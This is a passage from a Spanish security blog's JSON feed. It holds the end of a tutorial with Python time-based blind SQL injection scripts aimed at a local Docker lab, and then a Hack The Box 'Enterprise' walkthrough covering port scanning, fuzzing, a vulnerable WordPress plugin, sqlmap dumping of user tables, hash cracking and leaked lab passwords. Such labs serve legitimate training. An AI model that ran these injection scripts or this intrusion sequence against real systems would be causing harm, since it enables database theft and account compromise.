string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; def columns(url,sleep_time,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Columnas\u0026#34;) columns = \u0026#34;\u0026#34; for i in range(100): payload = \u0026#34;{} and if((select count(column_name) from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39;)={}, sleep({}), 1)-- -\u0026#34;.format(url,i,sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: cols = i break for col in range(cols): for i in range(100): payload = \u0026#34;{} and if(LENGTH((select column_name from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39; limit {}, 1))={}, sleep({}), 1)-- -\u0026#34;.format(url, col, i, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: col_length = i + 1 break columns += \u0026#34;\\n[*] \u0026#34; for position in range(col_length): for char in characters: p1.status(char) payload = \u0026#34;{} and if(substr((select column_name from information_schema.columns where table_schema = \u0026#39;my_database\u0026#39; and table_name = \u0026#39;mi_tabla\u0026#39; limit {},1),{},1)=\u0026#39;{}\u0026#39;,sleep({}),1)-- -\u0026#34;.format(url, col, position, char, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: columns += char p2.status(columns) break columns(url,sleep_time,characters) Data from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; sleep_time = 1 characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; + \u0026#34;:\u0026#34; def data(url,sleep_time,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Datos\u0026#34;) datos = \u0026#34;\u0026#34; for i in range(100): payload = \u0026#34;{} and if((select count(nombre) from my_database.mi_tabla)={}, sleep({}), 1)-- -\u0026#34;.format(url,i,sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: dts = i break for dt in range(dts): for i in range(100): payload = \u0026#34;{} and if(LENGTH((select nombre from my_database.mi_tabla limit {}, 1))={}, sleep({}), 1)-- -\u0026#34;.format(url, dt, i, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: dt_length = i + 1 break datos += \u0026#34;\\n[*] \u0026#34; for position in range(dt_length): for char in characters: p1.status(char) payload = \u0026#34;{} and if(substr((select nombre from my_database.mi_tabla limit {},1),{},1)=\u0026#39;{}\u0026#39;,sleep({}),1)-- -\u0026#34;.format(url, dt, position, char, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: datos += char p2.status(datos) break data(url,sleep_time,characters) Mas información relevante version() [Versión Base de datos]\rSELECT version(); from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; sleep_time = 1 characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; + \u0026#34;:\u0026#34; def version(url,sleep_time,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Datos\u0026#34;) versions = \u0026#34;\u0026#34; for v in range(1): for i in range(100): payload = \u0026#34;{} and if(LENGTH((select version() limit {}, 1))={}, sleep({}), 1)-- -\u0026#34;.format(url, v, i, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: v_length = i + 1 break versions += \u0026#34;\\n[*] \u0026#34; for position in range(v_length): for char in characters: p1.status(char) payload = \u0026#34;{} and if(substr((select version() limit {},1),{},1)=\u0026#39;{}\u0026#39;,sleep({}),1)-- -\u0026#34;.format(url, v, position, char, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: versions += char p2.status(versions) break version(url,sleep_time,characters) user() [Usuario que ejecuta la base de datos]\rSELECT user(); \u0026gt; python3 main.py [\u0026gt;] Probando con: 3 [*] Usuario: [*] root@172.19.0.3 from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; sleep_time = 1 characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; + \u0026#34;:\u0026#34; def user(url,sleep_time,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Usuario\u0026#34;) users = \u0026#34;\u0026#34; for user in range(1): for i in range(100): payload = \u0026#34;{} and if(LENGTH((select user() limit {}, 1))={}, sleep({}), 1)-- -\u0026#34;.format(url, user, i, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: v_length = i + 1 break users += \u0026#34;\\n[*] \u0026#34; for position in range(v_length): for char in characters: p1.status(char) payload = \u0026#34;{} and if(substr((select user() limit {},1),{},1)=\u0026#39;{}\u0026#39;,sleep({}),1)-- -\u0026#34;.format(url, user, position, char, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: users += char p2.status(users) break user(url,sleep_time,characters) database() [Base de datos en uso]\rSELECT database(); \u0026gt; python3 main.py [-] Probando con: e [ ] Base de datos en uso: [*] my_database from pwn import * import requests import string url = \u0026#34;http://localhost/?nombre=joan\u0026#39;\u0026#34; sleep_time = 1 characters = string.ascii_lowercase + string.digits + \u0026#34;_\u0026#34; + \u0026#34;-\u0026#34; + \u0026#34;.\u0026#34; + \u0026#34;@\u0026#34; + \u0026#34;:\u0026#34; def user(url,sleep_time,characters): p1 = log.progress(\u0026#34;Probando con\u0026#34;) p2 = log.progress(\u0026#34;Base de datos en uso\u0026#34;) databases = \u0026#34;\u0026#34; for db in range(1): for i in range(100): payload = \u0026#34;{} and if(LENGTH((select database() limit {}, 1))={}, sleep({}), 1)-- -\u0026#34;.format(url, db, i, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: db_length = i + 1 break databases += \u0026#34;\\n[*] \u0026#34; for position in range(db_length): for char in characters: p1.status(char) payload = \u0026#34;{} and if(substr((select database() limit {},1),{},1)=\u0026#39;{}\u0026#39;,sleep({}),1)-- -\u0026#34;.format(url, db, position, char, sleep_time) r = requests.get(payload) if r.elapsed.total_seconds() \u0026gt;= sleep_time: databases += char p2.status(databases) break user(url,sleep_time,characters) ","date":"2023-12-19","id":54,"permalink":"/blog/aprende-sqli-mysql/","summary":"Aprende SQLI con ejemplos y contenedores docker para poner en práctica todo lo que vas aprendiendo, a lo largo del post aprenderás 3 típos de SQLI: Basadas en tiempo, Union y Boleanas","tags":["SQLI","SQL"],"title":"Aprende SQLI (MySQL)"},{"content":"","date":"2023-12-19","id":55,"permalink":"/categories/","summary":"","tags":[],"title":"Categories"},{"content":"","date":"2023-12-19","id":56,"permalink":"/categories/ciberseguridad/","summary":"","tags":[],"title":"Ciberseguridad"},{"content":"","date":"2023-12-19","id":57,"permalink":"/tags/sql/","summary":"","tags":[],"title":"SQL"},{"content":"","date":"2023-12-19","id":58,"permalink":"/tags/sqli/","summary":"","tags":[],"title":"SQLI"},{"content":"","date":"2023-11-11","id":59,"permalink":"/tags/cron/","summary":"","tags":[],"title":"Cron"},{"content":"Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene\nping -c 1 10.10.10.61 PING 10.10.10.61 (10.10.10.61) 56(84) bytes of data. 64 bytes from 10.10.10.61: icmp_seq=1 ttl=63 time=94.2 ms --- 10.10.10.61 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 94.201/94.201/94.201/0.000 ms Tenemos conexión y en este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows. Esta máquina es Linux\nEscaneo de puertos Ahora empezamos con un escaneo de puertos\n$ sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.61 -oG allPorts Explicación parámetros\rParámetro Función -p- Para que el escaneo sea a todos los puertos (65536) \u0026ndash;open Para que solo reporte los puertos abiertos \u0026ndash;min-rate 5000 Definir el tiempo del escaneo -n Omitir resolución DNS -vvv Para que vaya reportando lo que encuentre por consola -Pn Para saltar la comprobación de sí la máquina está activa o no -oG allPorts Para que guarde el escaneo en format grepeable en un archivo llamado allPort Con una función definida en la zshrc llamada extractPorts, nos reporta los puertos abiertos de una forma más visual\nFunción extractPorts de @s4vitar\n───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────── │ File: extractPorts.tmp ───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────── 1 │ 2 │ [*] Extracting information... 3 │ 4 │ [*] IP Address: 10.10.10.61 5 │ [*] Open ports: 22,80,443,8080,32812 6 │ 7 │ [*] Ports copied to clipboard 8 │ ───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────── Ahora con nmap vamos a intentar buscar las versiones de los servicios que corren por los puertos y ejecutar scripts básicos de reconocimientos de nmap\n$ nmap -sCV -p22,80,443,8080,32812 10.10.10.61 -oN versions PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Ubuntu 10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:e9:8c:c5:b5:52:23:f4:b8:ce:d1:96:4a:c0:fa:ac (RSA) | 256 f3:9a:85:58:aa:d9:81:38:2d:ea:15:18:f7:8e:dd:42 (ECDSA) |_ 256 de:bf:11:6d:c0:27:e3:fc:1b:34:c0:4f:4f:6c:76:8b (ED25519) 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-generator: WordPress 4.8.1 |_http-title: USS Enterprise \u0026amp;#8211; Ships Log |_http-server-header: Apache/2.4.10 (Debian) 443/tcp open ssl/http Apache httpd 2.4.25 ((Ubuntu)) |_ssl-date: TLS randomness does not represent time |_http-server-header: Apache/2.4.25 (Ubuntu) | tls-alpn: |_ http/1.1 | ssl-cert: Subject: commonName=enterprise.local/organizationName=USS Enterprise/stateOrProvinceName=United Federation of Planets/countryName=UK | Not valid before: 2017-08-25T10:35:14 |_Not valid after: 2017-09-24T10:35:14 |_http-title: Apache2 Ubuntu Default Page: It works 8080/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-title: Home |_http-generator: Joomla! - Open Source Content Management |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: Apache/2.4.10 (Debian) | http-robots.txt: 15 disallowed entries | /joomla/administrator/ /administrator/ /bin/ /cache/ | /cli/ /components/ /includes/ /installation/ /language/ |_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/ 32812/tcp open unknown | fingerprint-strings: | GenericLines, GetRequest, HTTPOptions: | _______ _______ ______ _______ | |_____| |_____/ |______ | |_____ |_____ | | | _ ______| | Welcome to the Library Computer Access and Retrieval System | Enter Bridge Access Code: | Invalid Code | Terminating Console | NULL: | _______ _______ ______ _______ | |_____| |_____/ |______ | |_____ |_____ | | | _ ______| | Welcome to the Library Computer Access and Retrieval System |_ Enter Bridge Access Code: 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port32812-TCP:V=7.94%I=7%D=11/11%Time=654FAA2C%P=x86_64-pc-linux-gnu%r( SF:NULL,ED,\u0026#34;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20_______\\x20_______\\x20\\x20______\\x20_______\\n\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\|\\x20\\x20\\x20\\x20\\x20\\x20\\|\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\|_____\\|\\x20\\|_____/\\x20\\|______\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\|_____\\x20\\|_____\\x20\\x20\\|\\x20\\x20\\x20\\x20\\x20\\|\\x20\\|\\x20 SF:\\x20\\x20\\x20\\\\_\\x20______\\|\\n\\nWelcome\\x20to\\x20the\\x20Library\\x20Compu SF:ter\\x20Access\\x20and\\x20Retrieval\\x20System\\n\\nEnter\\x20Bridge\\x20Acces SF:s\\x20Code:\\x20\\n\u0026#34;)%r(GenericLines,110,\u0026#34;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_______\\x20_______\\x20\\x20______\\ SF:x20_______\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|_____\\|\\x20\\|_____/\\x20\\|______\\ SF:n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|_____\\x20\\|_____\\x20\\x20\\|\\x SF:20\\x20\\x20\\x20\\x20\\|\\x20\\|\\x20\\x20\\x20\\x20\\\\_\\x20______\\|\\n\\nWelcome\\x2 SF:0to\\x20the\\x20Library\\x20Computer\\x20Access\\x20and\\x20Retrieval\\x20Syst SF:em\\n\\nEnter\\x20Bridge\\x20Access\\x20Code:\\x20\\n\\nInvalid\\x20Code\\nTermin SF:ating\\x20Console\\n\\n\u0026#34;)%r(GetRequest,110,\u0026#34;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_______\\x20_______\\x20\\x20_____ SF:_\\x20_______\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|_____\\|\\x20\\|_____/\\x20\\|_____ SF:_\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|_____\\x20\\|_____\\x20\\x20\\| SF:\\x20\\x20\\x20\\x20\\x20\\|\\x20\\|\\x20\\x20\\x20\\x20\\\\_\\x20______\\|\\n\\nWelcome\\ SF:x20to\\x20the\\x20Library\\x20Computer\\x20Access\\x20and\\x20Retrieval\\x20Sy SF:stem\\n\\nEnter\\x20Bridge\\x20Access\\x20Code:\\x20\\n\\nInvalid\\x20Code\\nTerm SF:inating\\x20Console\\n\\n\u0026#34;)%r(HTTPOptions,110,\u0026#34;\\n\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_______\\x20_______\\x20\\x20__ SF:____\\x20_______\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|_____\\|\\x20\\|_____/\\x20\\|__ SF:____\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\|_____\\x20\\|_____\\x20\\x2 SF:0\\|\\x20\\x20\\x20\\x20\\x20\\|\\x20\\|\\x20\\x20\\x20\\x20\\\\_\\x20______\\|\\n\\nWelco SF:me\\x20to\\x20the\\x20Library\\x20Computer\\x20Access\\x20and\\x20Retrieval\\x2 SF:0System\\n\\nEnter\\x20Bridge\\x20Access\\x20Code:\\x20\\n\\nInvalid\\x20Code\\nT SF:erminating\\x20Console\\n\\n\u0026#34;); Service Info: OS: Linux; CPE: cpe:/ Explicación parámetros\rParámetro Función -p Especificamos los puertos abiertos que hemos encontrado con el escaneo anterior -sC Para que realice scripts básicos de reconocimiento -sV Proporciona la versión e información de los servicios que corren por los puertos Puerto 443 Nmap reporto que hay una web corriendo por el puerto 443. Al entrar, esta web muestra la página default de apache en un ubuntu. Puede ser que existan otras rutas, así que vamos a hacer fuzzing\nwfuzz -c -t 20 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://10.10.10.61/FUZZ ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000094: 301 9 L 28 W 312 Ch \u0026#34;files\u0026#34; Explicación parámetros\r-c: Mostrar el resultado con colores -t: Definir el tiempo del escaneo \u0026ndash;hc=404: Con esto le decimos que no nos interesan las respuestas cuyo código de estado sea 404, lo que significa que no queremos que nos reporte páginas que no existen -w: Diccionario FUZZ: Es donde va a ir probando el contenido del diccionario Wfuzz ha reportado la exsistencia de un directorio llamado files. Al entrar se ve un archivo llamado lcars.zip que si lo descargamos y descomprimimos vemos que contiene 3 archivos:\nlcars.php\nEste archivo está vacío, no contiene código php, pero sí tiene unos comentarios que nos hacen pensar que es un plugin de alguna web. Podemos ver el nombre del plugin: lcars. El nombre del dominio: enterprise.htb. Y 3 comentarios: Need to create the user interface, need to finsih the db interface y need to make it secure. El último comentario dice que \u0026ldquo;lo tiene que hacer más seguro\u0026rdquo;, puede ser que el plugin sea vulnerable.\n\u0026lt;?php /* * Plugin Name: lcars * Plugin URI: enterprise.htb * Description: Library Computer Access And Retrieval System * Author: Geordi La Forge * Version: 0.2 * Author URI: enterprise.htb * */ // Need to create the user interface. // need to finsih the db interface // need to make it secure ?\u0026gt; lcars_dbpost.php\nEste archivo contiene código php, en el código se incluye el archivo /var/www/html/wp-config.php que seguramente es el que tiene las credenciales de la base de datos. Después hace una petición a la base de datos SELECT post_title FROM wp_posts WHERE ID = $query en la cual se están seleccionando los \u0026ldquo;post_title\u0026rdquo; de la tabla wp_posts donde el id es igual a $query y $query equivale a lo que se manda por el método get en el parámetro query. Antes de hacer la petición convierte la data que se pasa por el parámetro query a un int, un número, lo que da a entender que está esperando un número, esto no tiene pinta de ser vulnerable, ya que convierte a int la data que le pasamos.\n\u0026lt;?php include \u0026#34;/var/www/html/wp-config.php\u0026#34;; $db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME); // Test the connection: if (mysqli_connect_errno()){ // Connection Error exit(\u0026#34;Couldn\u0026#39;t connect to the database: \u0026#34;.mysqli_connect_error()); } // test to retireve a post name if (isset($_GET[\u0026#39;query\u0026#39;])){ $query = (int)$_GET[\u0026#39;query\u0026#39;]; $sql = \u0026#34;SELECT post_title FROM wp_posts WHERE ID = $query\u0026#34;; $result = $db-\u0026gt;query($sql); if ($result){ $row = $result-\u0026gt;fetch_row(); if (isset($row[0])){ echo $row[0]; } } } else { echo \u0026#34;Failed to read query\u0026#34;; } ?\u0026gt; lcars_db.php\nPor último el archivo lcars_db.php también contiene código php, en el código se vuelve a incluir el archivo /var/www/html/wp-config.php que como dije en el anterior, seguramente es el archivo que contiene las credenciales de la base de datos. Después hace una petición a la base de datos en la cual selecciona los ID de la tabla \u0026ldquo;wp_posts\u0026rdquo; donde la columna \u0026ldquo;post_name\u0026rdquo; sea igual a $query. El script con $query se refiere a la data que le mandamos con el metodo GET por el parametro query SELECT ID FROM wp_posts WHERE post_name = $query. Este archivo cambia un poco, ya que la petición no es la misma y $query ya no es un número. Al no convertir a int nuestro input, se pone directamente nuestro input en la petición, sin ningún tipo de sanitización, lo que parece que puede ser vulnerable a una SQLI\n\u0026lt;?php include \u0026#34;/var/www/html/wp-config.php\u0026#34;; $db = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME); // Test the connection: if (mysqli_connect_errno()){ // Connection Error exit(\u0026#34;Couldn\u0026#39;t connect to the database: \u0026#34;.mysqli_connect_error()); } // test to retireve an ID if (isset($_GET[\u0026#39;query\u0026#39;])){ $query = $_GET[\u0026#39;query\u0026#39;]; $sql = \u0026#34;SELECT ID FROM wp_posts WHERE post_name = $query\u0026#34;; $result = $db-\u0026gt;query($sql); echo $result; } else { echo \u0026#34;Failed to read query\u0026#34;; } ?\u0026gt; enterprise.htb En el primer archivo dentro de lcars se identificó un comentario en el cual ponía un dominio:\nPlugin URI: enterprise.htb Para hacer que funcione el dominio hay que añadirlo en el /etc/hosts acompañado de la ip de la máquina víctima, para qué nuestra máquina sepa a que estamos haciendo referencia cuando le hablamos del enterprise.htb.\n10.10.10.61 enterprise.htb Una vez completado este paso ya podemos entrar a la web con el dominio. Pero antes que nada vamos a hacer un whatweb para saber un poco más de información sobre la web\nwhatweb enterprise.htb http://enterprise.htb [200 OK] Apache[2.4.10], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Debian Linux][Apache/2.4.10 (Debian)], IP[10.10.10.61], JQuery[1.12.4], MetaGenerator[WordPress 4.8.1], PHP[5.6.31], PoweredBy[WordPress], Script[text/javascript], Title[USS Enterprise \u0026amp;#8211; Ships Log], UncommonHeaders[link], WordPress[4.8.1], X-Powered-By[PHP/5.6.31] Del resultado del whatweb podemos ver que es un Wordpress de versión 4.8.1 (versión bastante desactualizada)\nSabiendo que es un wordpress podemos usar la herramienta wpscan para enumerar usuarios.\nwpscan --url=http://enterprise.htb -e u [i] User(s) Identified: [+] william.riker | Found By: Author Posts - Display Name (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Login Error Messages (Aggressive Detection) [+] william-riker | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) Ha encontrado 2 posibles usuarios william.riker y william-riker, básicamente son el mismo usuario, pero en partes distintas de la web por lo que está escrito de distinta forma, debajo de william.riker pone Login Error Messages así que vamos a suponer que el usuario es william-riker\nExplotación SQLI Ahora podríamos probar de ver si el plugin que se mencionaba en la otra web está instalado en este wordpress, para saberlo sin estar autenticados vamos a hacer lo siguiente: Los plugins en wordpress suelen estar en wp-content/plugins/ asi que lo que pode mos hacer es intentar entrar en la carpeta wp-content/plugins/lcars que debería ser la carpeta del plugin, ya que se llama lcars. Sí hacemos un curl en la carpeta nos responde con un código 403 Lo que significa forbidden\ncurl -o /dev/null -s -w \u0026#34;%{http_code}\\n\u0026#34; enterprise.htb/wp-content/plugins/lcars/ 403 Pero si hacemos la misma petición a un servidor random, nos devuelve un código 404, Not Found\ncurl -o /dev/null -s -w \u0026#34;%{http_code}\\n\u0026#34; enterprise.htb/wp-content/plugins/testing/ 404 Con estos dos comandos podemos sacar la conclusión de que si existe una carpeta llamada lcars, pero no tenemos permisos para ver el contenido que hay en ella, pero jugamos con ventaja, ya que hemos visto el código del plugin y ya sabemos qué archivos puede haber y cuál puede ser vulnerable.\nVamos a probar de ver con curl si existe el archivo lcars_db.php que habíamos visto anteriormente que parecía que podía ser vulnerable a SQLI\ncurl \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php\u0026#34; Failed to read query Sí recordamos, le podíamos mandar cosas por el método GET con el parámetro query\ncurl \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=test\u0026#34; Pero no responde con nada. Vamos a probar de añadir una inyección sql que lo que va a hacer es que la petición tarde 5 segundos en procesarse 1 and sleep(5), esto lo vamos a juntar con el comando de curl url encodeado y el comando time para que nos diga cuanto tiempo tarda en ejecutarse el comando. (Para url encodear el payload de la SQLI se puede hacer con una web o manualmente cambiando los espacios por %20 y los \u0026ldquo;()\u0026rdquo; por %28 y %29)\ntime curl \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1%20and%20sleep%285%29\u0026#34; \u0026lt;br /\u0026gt; \u0026lt;b\u0026gt;Catchable fatal error\u0026lt;/b\u0026gt;: Object of class mysqli_result could not be converted to string in \u0026lt;b\u0026gt;/var/www/html/wp-content/plugins/lcars/lcars_db.php\u0026lt;/b\u0026gt; on line \u0026lt;b\u0026gt;16\u0026lt;/b\u0026gt;\u0026lt;br /\u0026gt; real\t6.71s user\t0.00s sys\t0.01s cpu\t0% Confirmado, es vulnerable, le dijimos a la base de datos que hiciera un sleep de 5 segundos y la peticion ha tardado en llegar 6.71, lo que significa que ha funcionado\nPara automatizar la inyección vamos a usar la herramienta sqlmap, sqlmap es una herramienta que en algunas certificaciones como OSCP está prohibida, pero para esta máquina va muy bien, ya que haciéndolo manual tardaríamos mucho, muchísimo!\nsqlmap --url \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1\u0026#34; --batch Parameter: query (GET) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: query=(SELECT (CASE WHEN (9063=9063) THEN 1 ELSE (SELECT 3395 UNION SELECT 7761) END)) Type: error-based Title: MySQL \u0026gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: query=1 AND (SELECT 6881 FROM(SELECT COUNT(*),CONCAT(0x71766b7171,(SELECT (ELT(6881=6881,1))),0x71706a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) Type: time-based blind Title: MySQL \u0026gt;= 5.0.12 AND time-based blind (query SLEEP) Payload: query=1 AND (SELECT 1921 FROM (SELECT(SLEEP(5)))CmQp) Sqlmap nos confirma que es vulnerable y nos dice los 3 tipos de SQLI que se pueden usar\nboolean-based blind error-based time-based blind Para enumerar las bases de datos vamos a usar el parámetro --dbs\nsqlmap --url \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1\u0026#34; --batch --dbs available databases [8]: [*] information_schema [*] joomla [*] joomladb [*] mysql [*] performance_schema [*] sys [*] wordpress [*] wordpressdb Una vez que ya sabemos que bases de datos, vamos a ver qué tablas hay de la base de datos del wordpress, para ello con -D vamos a especificar la base de datos y con --tables vamos a listar las tablas\nsqlmap --url \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1\u0026#34; --batch -D wordpress --tables Database: wordpress [12 tables] +-----------------------+ | wp_commentmeta | | wp_comments | | wp_links | | wp_options | | wp_postmeta | | wp_posts | | wp_term_relationships | | wp_term_taxonomy | | wp_termmeta | | wp_terms | | wp_usermeta | | wp_users | +-----------------------+ Ahora vamos a sacar toda la información de la tabla wp_users, para especificar la tabla vamos a usar -T y para ver el contenido --dump\nsqlmap --url \u0026#34;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1\u0026#34; --batch -D wordpress -T wp_users --dump Database: wordpress Table: wp_users [1 entry] +----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+ | ID | user_url | user_pass | user_email | user_login | user_status | display_name | user_nicename | user_registered | user_activation_key | +----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+ | 1 | \u0026lt;blank\u0026gt; | $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2. | william.riker@enterprise.htb | william.riker | 0 | william.riker | william-riker | 2017-09-03 19:20:56 | \u0026lt;blank\u0026gt; | +----+----------+------------------------------------+------------------------------+---------------+-------------+---------------+---------------+---------------------+---------------------+ Ya podemos confirar la existencia del usuario william.riker y tenemos su contraseña hasheada: $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2.. Este hash lo podemos intentar romper de la siguiente forma.\necho \u0026#39;$P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2.\u0026#39; \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash Using default input encoding: UTF-8 Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3]) Cost 1 (iteration count) is 8192 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Lo dejé corriendo un buen rato y nada, no puede sacar la pass, así que vamos a seguir enumerando la base de datos. Vamos a ver el contenido de la tabla wp_posts\nEn la columna post_content vemos que hay 3 entradas que contienen el siguiente texto\nNeeded somewhere to put some passwords quickly\\r\\n\\r\\nZxJyhGem4k338S2Y\\r\\n\\r\\nenterprisencc170\\r\\n\\r\\nZD3YxfnSjezg67JZ\\r\\n\\r\\nu*Z14ru0p#ttj83zS6\\r\\n\\r\\n \\r\\n\\r\\n Para que interprete los enters podemos usar python:\n$python3 \u0026gt;\u0026gt;\u0026gt; print(\u0026#39;Needed somewhere to put some passwords quickly\\r\\n\\r\\nZxJyhGem4k338S2Y\\r\\n\\r\\nenterprisencc170\\r\\n\\r\\nZD3YxfnSjezg67JZ\\r\\n\\r\\nu*Z14ru0p#ttj83zS6\\r\\n\\r\\n \\r\\n\\r\\n\u0026#39;) Needed somewhere to put some passwords quickly ZxJyhGem4k338S2Y enterprisencc170 ZD3YxfnSjezg67JZ u*Z14ru0p#ttj83zS6 Parece que ya tenemos 4 contraseñas que a lo mejor son las del wordpress. No las vamos a probar una a una, vamos a hacer fuerza bruta automatizada de 3 formas distintas\nEste wordpress tiene el xmlrpc.php accesible así que nos podemos aprovechar de él para hacer la fuerza bruta. Primero vamos a listar los métodos que tiene disponibles, mandándole una petición por post con la siguiente data\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt; \u0026lt;methodCall\u0026gt; \u0026lt;methodName\u0026gt;system.listMethods\u0026lt;/methodName\u0026gt; \u0026lt;params\u0026gt;\u0026lt;/params\u0026gt; \u0026lt;/methodCall\u0026gt; curl -X POST \u0026#34;http://enterprise.htb/xmlrpc.php\u0026#34; -d@data.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;methodResponse\u0026gt; \u0026lt;params\u0026gt; \u0026lt;param\u0026gt; \u0026lt;value\u0026gt; \u0026lt;array\u0026gt;\u0026lt;data\u0026gt; ..... \u0026lt;value\u0026gt;\u0026lt;string\u0026gt;wp.getPost\u0026lt;/string\u0026gt;\u0026lt;/value\u0026gt; 